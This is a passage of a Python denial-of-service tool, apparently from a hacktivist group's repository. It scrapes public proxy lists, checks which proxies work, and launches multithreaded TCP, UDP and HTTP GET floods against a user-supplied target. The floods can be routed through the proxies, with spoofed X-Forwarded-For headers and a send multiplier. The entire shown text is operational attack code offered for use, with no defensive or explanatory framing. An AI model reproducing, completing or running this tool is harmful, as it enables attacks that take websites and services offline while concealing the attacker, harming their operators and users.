            "https://api.openproxylist.xyz/socks5.txt",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
            "https://openproxylist.xyz/socks5.txt",
            "https://proxyspace.pro/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
            "https://openproxylist.xyz/socks4.txt",
            "https://proxyspace.pro/socks4.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://www.proxyscan.io/download?type=socks4",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
            "https://api.openproxylist.xyz/socks4.txt",
        ]
        ips = []
        print(
            f"{Fore.GREEN}\
[w00t!] - Downloading proxies, this might take a while!"
        )
        print(
            f"{Fore.GREEN}[w00t!] - This is SOCK4 & 5 Proxy. Use Mix Proxy for bigger proxy list."
        )
        for api in sock_api:
            try:
                r = requests.get(api, timeout=15)
                ips += re.findall(r"(?:\\d{1,3}[\\.:]){3}\\d{1,3}:\\d+", r.text)
            except:
                pass
        with open("proxy.txt", "w") as f:
            for ip in set(ips):
                f.write(
                    ip
                    + "\
"
                )
        print(f"{Fore.GREEN}[w00t!] - Successful with no problemo!")
    except:
        print(
            "\
ERROR!\
"
        )
    CheckProxyOption()


def proxysmall():
    try:
        http_api = [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxyscan.io/download?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://api.openproxylist.xyz/http.txt",
        ]
        ips = []
        print(
            f"{Fore.GREEN}\
[w00t!] - Downloading proxies, please wait!"
        )
        print(f"{Fore.GREEN}[w00t!] - Fast internet speed? Use bigger List Proxy.")
        for api in http_api:
            try:
                r = requests.get(api, timeout=15)
                ips += re.findall(r"(?:\\d{1,3}[\\.:]){3}\\d{1,3}:\\d+", r.text)
            except:
                pass
        with open("proxy.txt", "w") as f:
            for ip in set(ips):
                f.write(
                    ip
                    + "\
"
                )
        print(f"{Fore.GREEN}[w00t!] - Successful with no problemo!")
    except:
        print(
            "\
ERROR!\
"
        )
    CheckProxyOption()


def proxybig():
    try:
        http_api = [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxyscan.io/download?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://api.openproxylist.xyz/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "http://alexa.lr2b.com/proxylist.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://multiproxy.org/txt_all/proxy.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
            "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
            "https://openproxylist.xyz/http.txt",
            "https://proxyspace.pro/http.txt",
            "https://proxyspace.pro/https.txt",
            "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
            "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
            "https://raw.githubusercontent.com/saisuiu/uiu/main/cnfree.txt",
            "https://rootjazz.com/proxies/proxies.txt",
            "https://www.proxy-list.download/api/v1/get?type=https",
        ]
        ips = []
        print(
            f"{Fore.GREEN}\
[w00t!] - Downloading proxies, please wait!"
        )
        print(
            f"{Fore.GREEN}\
[w00t!] - Huge proxy list, this might take a while."
        )
        for api in http_api:
            try:
                r = requests.get(api, timeout=15)
                ips += re.findall(r"(?:\\d{1,3}[\\.:]){3}\\d{1,3}:\\d+", r.text)
            except:
                pass
        with open("proxy.txt", "w") as f:
            for ip in set(ips):
                f.write(
                    ip
                    + "\
"
                )
        print(f"{Fore.GREEN}[w00t!] - Successful with no problemo!")
    except:
        print(
            "\
ERROR!\
"
        )
    CheckProxyOption()


def CheckProxyOption():
    global out_file
    proxyopt = input(
        f"{Fore.CYAN}[ Check Proxy? ] - {Fore.GREEN}[Y] Check proxy {Fore.RED}(Will take time!) {Fore.GREEN}| {Fore.MAGENTA}[N] Skip Proxy Checks\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if proxyopt.lower() == "y":
        CheckProxy()
    elif proxyopt.lower() == "n":
        out_file = "own_proxy"
        proxylist()
    else:
        print(f"{Fore.Red}Wrong option, try again.")
        CheckProxyOption()


def CheckProxy():
    def check_proxy(proxy_type, proxy):
        try:
            requests.get(
                "https://icanhazip.com", proxies={proxy_type: proxy}, timeout=5
            )
            return True
        except:
            return False

    def update_progress(progress, total):
        bar_length = 40
        filled_length = int(round(bar_length * progress / float(total)))
        bar = "=" * filled_length + "-" * (bar_length - filled_length)
        print(
            f"{Fore.GREEN}\\r[w00t!] - Checking proxies with 4 thread {Fore.YELLOW}[{bar}] {Fore.CYAN}{progress}{Fore.GREEN}/{Fore.YELLOW}{total} ",
            end="",
            flush=True,
        )

    if os.path.exists("working_proxy.txt"):
        os.remove("working_proxy.txt")
    with open("proxy.txt", "r") as file:
        proxies = [line.strip() for line in file.readlines()]

    total = len(proxies)
    success_count = 0
    failure_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=400) as executor:
        futures = []
        for proxy in proxies:
            for proxy_type in ["http", "https", "sock4", "sock5"]:
                future = executor.submit(check_proxy, proxy_type, proxy)
                futures.append(future)

        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            success = future.result()
            if success:
                success_count += 1
                proxy = proxies[i // 4]
                with open("working_proxy.txt", "a") as f:
                    f.write(
                        f"{proxy}\
"
                    )
            else:
                failure_count += 1

            update_progress(i + 1, total * 4)

    print(
        f"{Style.RESET_ALL}\
{Fore.MAGENTA}[Checked {total} proxies]: {Fore.GREEN}{success_count} Working {Fore.MAGENTA}|{Fore.MAGENTA} {Fore.RED}{failure_count} Not Working.\
{Fore.MAGENTA}[+] Duplicate will be removed next."
    )
    proxylist()


def proxylist():
    global proxies, out_file
    print(
        f"\
{Fore.GREEN}[w00t!] - {Fore.MAGENTA}Removing duplicate proxies."
    )
    if out_file == "new_proxy":
        out_file = "working_proxy.txt"
    elif out_file == "own_proxy":
        out_file = "proxy.txt"
    else:
        out_file = "proxy.txt"

    with open(out_file, "r") as f:
        dupe_proxy = set(f.readlines())

    with open(out_file, "w") as f:
        for proxy in dupe_proxy:
            f.write(proxy)

    with open(out_file, "r") as f:
        proxies = [x.strip() for x in f.readlines()]

    if len(proxies) > 10 and out_file == "proxy.txt":
        print(f"{Fore.GREEN}[w00t!] - {Fore.MAGENTA}Working Proxy: ({len(proxies)})")
    elif out_file == "working_proxy.txt":
        print(
            f"{Fore.GREEN}[w00t!] - {Fore.MAGENTA}Total working proxy:({len(proxies)}):"
        )
    else:
        print(f"{Fore.GREEN}[w00t!] - {Fore.RED}No proxy file detected!")
        exit(0)
    numthreads()


def numthreads():
    global threads
    try:
        threads = int(
            input(
                f"\
\
{Fore.CYAN}[w00t!] - {Fore.GREEN}Enter your desired thread amount.{Fore.YELLOW}\
- Threads for Low-End Devices   {Fore.RED}[15-30]{Fore.YELLOW}\
- Threads for Mid-End Devices   {Fore.RED}[31-50]{Fore.YELLOW}\
- Threads for High-End Devices {Fore.RED}[51-100]\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
            )
        )
        if threads < 15:
            print(
                f"{Fore.GREEN}\
[w00t!] - Thread are set too low! Try again."
            )
            numthreads()
        elif threads >= 15:
            print(
                f"{Fore.GREEN}\
[w00t!] - Thread are set to [{threads}].\
\
"
            )
        elif threads >= 50:
            print(
                f"{Fore.GREEN}\
[w00t!] - Thread are set to [{threads}].\
\
{Fore.YELLOW}[w00t!] - Temperature may rise unexpectedly!"
            )
    except ValueError:
        print(
            f"{Fore.RED}\
[w00t!] - Invalid thread number!\
"
        )
        numthreads()
    if threads > 100:
        print(f"{Fore.RED}[w00t!] - Error: Exceeding 100 is too overkill! Try again.")
    multiplication()


def multiplication():
    global multiple
    try:
        multiple = int(
            input(
                f"{Fore.CYAN}\
Minimum Multiplication Attack\
\
{Fore.GREEN}- Low Multiplier: [50-100]\
{Fore.BLUE}- Normal Multiplier: [100-500]\
{Fore.MAGENTA}- Best Multiplier: [500-1000]\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
            )
        )
    except ValueError:
        print(
            f"{Fore.RED}You mistyped, try again.\
"
        )
        multiplication()
    begin()


def begin():
    choice6 = input(
        f"{Fore.CYAN}\
Press 'w00t!' to start Attack\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if choice6 == "w00t!":
        loop()
    else:
        print(
            f"{Fore.RED}You mistyped, try again.\
"
        )
        exit(0)


def loop():
    global threads
    global get_host
    global acceptall
    global connection
    global go
    global x
    go = threading.Event()
    if choice1 == "0":
        get_host = (
            "GET "
            + url
            + " HTTP/1.1\\r\
Host: "
            + url2
            + "\\r\
"
        )
        acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\\r\
Accept-Language: en-US,en;q=0.5\\r\
Accept-Encoding: gzip, deflate\\r\
",
            "Accept-Encoding: gzip, deflate\\r\
",
            "Accept-Language: en-US,en;q=0.5\\r\
Accept-Encoding: gzip, deflate\\r\
",
        ]
        connection = "Connection: Keep-Alive\\r\
"
        x = 0
    if choice1 == "1":
        if choice2 == "y":
            if choice3 == "0":
                for x in range(threads):
                    tcpfloodproxed(x + 1).start()
                    print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
                go.set()
            else:
                for x in range(threads):
                    tcpfloodsocked(x + 1).start()
                    print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
                go.set()
        else:
            for x in range(threads):
                tcpflood(x + 1).start()
                print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
            go.set()
    if choice1 == "2":
        if choice2 == "y":
            if choice3 == "0":
                for x in range(threads):
                    udpfloodproxed(x + 1).start()
                    print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
                go.set()
            else:
                for x in range(threads):
                    udpfloodsocked(x + 1).start()
                    print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
                go.set()
        else:
            for x in range(threads):
                udpflood(x + 1).start()
                print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
            go.set()
    if choice1 == "0":
        if choice2 == "y":
            if choice3 == "0":
                for x in range(threads):
                    requestproxy(x + 1).start()
                    print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
                go.set()
            else:
                for x in range(threads):
                    requestsocks(x + 1).start()
                    print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
                go.set()
        else:
            for x in range(threads):
                requestproxy(x + 1).start()
                print(f"{Fore.CYAN}Thread " + str(x) + " Ready!")
            go.set()


class tcpfloodproxed(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(2048)
        p = bytes(
            IP(dst=str(url2)) / TCP(sport=RandShort()._fix(), dport=int(port)) / data
        )
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(":")
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(
                    socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True
                )
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print(
                    f"{Fore.GREEN}[w00t!] - Request sent from "
                    + str(proxy[0])
                    + ":"
                    + str(proxy[1])
                    + " @",
                    self.counter,
                )
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class tcpfloodsocked(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(2048)
        p = bytes(
            IP(dst=str(url2)) / TCP(sport=RandShort()._fix(), dport=int(port)) / data
        )
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(":")
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(
                    socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True
                )
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print(
                    f"{Fore.GREEN}[w00t!] - Request sent from "
                    + str(proxy[0])
                    + ":"
                    + str(proxy[1])
                    + " @",
                    self.counter,
                )
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(
                        socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True
                    )
                    s = socks.socksocket()
                    s.connect((str(url2), int(port)))
                    s.send(p)
                    print(
                        f"{Fore.GREEN}[w00t!] - Request sent from "
                        + str(proxy[0])
                        + ":"
                        + str(proxy[1])
                        + " @",
                        self.counter,
                    )
                    try:
                        for y in range(multiple):
                            s.send(str.encode(p))
                    except:
                        s.close()
                except:
                    print(f"{Fore.RED}Sock down. Retrying request. @", self.counter)
                    s.close()


class tcpflood(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(2048)
        p = bytes(
            IP(dst=str(url2)) / TCP(sport=RandShort()._fix(), dport=int(port)) / data
        )
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(port)))
                s.send(p)
                print(f"{Fore.GREEN}[w00t!] - Request Sent! @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class udpfloodproxed(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(2048)
        p = bytes(IP(dst=str(url2)) / UDP(dport=int(port)) / data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(":")
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(
                    socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True
                )
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print(
                    f"{Fore.GREEN}[w00t!] - Request sent from "
                    + str(proxy[0])
                    + ":"
                    + str(proxy[1])
                    + " @",
                    self.counter,
                )
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class udpfloodsocked(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(2048)
        p = bytes(IP(dst=str(url2)) / UDP(dport=int(port)) / data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(":")
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(
                    socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True
                )
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print(
                    f"{Fore.GREEN}[w00t!] - Request sent from "
                    + str(proxy[0])
                    + ":"
                    + str(proxy[1])
                    + " @",
                    self.counter,
                )
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(
                        socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True
                    )
                    s = socks.socksocket()
                    s.connect((str(url2), int(port)))
                    s.send(p)
                    print(
                        f"{Fore.GREEN}[w00t!] - Request sent from "
                        + str(proxy[0])
                        + ":"
                        + str(proxy[1])
                        + " @",
                        self.counter,
                    )
                    try:
                        for y in range(multiple):
                            s.send(str.encode(p))
                    except:
                        s.close()
                except:
                    print(f"{Fore.RED}Sock down. Retrying request. @", self.counter)
                    s.close()


class udpflood(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(2048)
        p = bytes(IP(dst=str(url2)) / UDP(dport=int(port)) / data)
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(port)))
                s.send(p)
                print(f"{Fore.GREEN}[w00t!] - Request Sent! @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class requestproxy(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = (
            "User-Agent: "
            + random.choice(useragents)
            + "\\r\
"
        )
        accept = random.choice(acceptall)
        randomip = (
            str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
        )
        forward = (
            "X-Forwarded-For: "
            + randomip
            + "\\r\
"
        )
        request = (
            get_host
            + useragent
            + accept
            + forward
            + connection
            + "\\r\
"
        )
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(":")
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy[0]), int(proxy[1])))
                s.send(str.encode(request))
                print(
                    f"{Fore.GREEN}[w00t!] - Request sent from "
                    + str(proxy[0])
                    + ":"
                    + str(proxy[1])
                    + " @",
                    self.counter,
                )
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()


class requestsocks(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = (
            "User-Agent: "
            + random.choice(useragents)
            + "\\r\
"
        )
        accept = random.choice(acceptall)
        request = (
            get_host
            + useragent
            + accept
            + connection
            + "\\r\
"
        )
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(":")
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(
                    socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True
                )
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(str.encode(request))
                print(
                    f"{Fore.GREEN}[w00t!] - Request sent from "
                    + str(proxy[0])
                    + ":"
                    + str(proxy[1])
                    + " @",
                    self.counter,
                )
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(
                        socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True
                    )
                    s = socks.socksocket()
                    s.connect((str(url2), int(port)))
                    s.send(str.encode(request))
                    print(
                        f"{Fore.GREEN}[w00t!] - Request sent from "
                        + str(proxy[0])
                        + ":"
                        + str(proxy[1])
                        + " @",
                        self.counter,
                    )
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        s.close()
                except:
                    print(f"{Fore.RED}Sock down. Retrying request. @", self.counter)
                    s.close()


# fix later
class requestdefault(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = (
            "User-Agent: "
            + random.choice(useragents)
            + "\\r\
"
        )
        accept = random.choice(acceptall)
        request = (
            get_host
            + useragent
            + accept
            + connection
            + "\\r\
"
        )
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(port)))
                s.send(str.encode(request))
                print(
                    f"{Fore.GREEN}[w00t!] - Request Sent from {s.getsockname()[0]} @ ",
                    self.counter,
                )
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()


inputType()
